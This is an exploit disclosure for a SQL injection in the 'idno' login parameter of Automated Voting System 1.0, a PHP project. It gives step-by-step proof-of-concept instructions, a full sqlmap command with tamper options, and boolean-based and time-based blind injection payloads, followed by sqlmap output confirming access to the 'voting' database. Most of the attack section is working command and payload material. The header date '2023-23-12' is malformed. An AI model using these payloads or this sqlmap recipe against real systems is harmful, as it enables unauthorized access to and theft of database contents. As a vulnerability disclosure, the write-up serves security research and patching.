# Automated_Voting_System-SQL_Injection-2
+ **Exploit Title:** Automated_Voting_System-SQL_Injection-2
+ **Date:** 2023-23-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/automated-voting-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/02/AUTOMATED_VOTING_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** CVE-

## References: 

## Description:
Automated Voting System 1.0 allows SQL Injection via parameter 'idno' in "/automated%20voting/".
Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the voter panel: "http://localhost/automated%20voting/"
+ Fill the voter id and password then click 'Login' button.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Use sqlmap to exploit.
+ In sqlmap, use 'idno' parameter to dump the database. 
```
sqlmap -r r.txt -p idno --risk 3 --level 5 --threads 1 --random-agent tamper=between, randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: MULTIPART idno ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: -----------------------------330798109512083143982793838470
Content-Disposition: form-data; name="idno"

-4883' OR 7870=7870-- eCXU
-----------------------------330798109512083143982793838470
Content-Disposition: form-data; name="password"

pass
-----------------------------330798109512083143982793838470
Content-Disposition: form-data; name="login"


-----------------------------330798109512083143982793838470--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------330798109512083143982793838470
Content-Disposition: form-data; name="idno"

11111' AND (SELECT 7894 FROM (SELECT(SLEEP(5)))TcOW)-- MvbQ
-----------------------------330798109512083143982793838470
Content-Disposition: form-data; name="password"

pass
-----------------------------330798109512083143982793838470
Content-Disposition: form-data; name="login"


-----------------------------330798109512083143982793838470--
---
[19:31:16] [INFO] testing MySQL
got a 302 redirect to 'http://localhost/automated%20voting/vote.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[19:31:17] [INFO] confirming MySQL
[19:31:18] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:31:18] [INFO] fetching current database
[19:31:18] [INFO] resumed: voting
current database: 'voting'
```

+ current database: `voting`
![02](https://github.com/h4md153v63n/CVEs/assets/5091265/abe5fcf0-759b-470b-866c-6a546f8fb824)
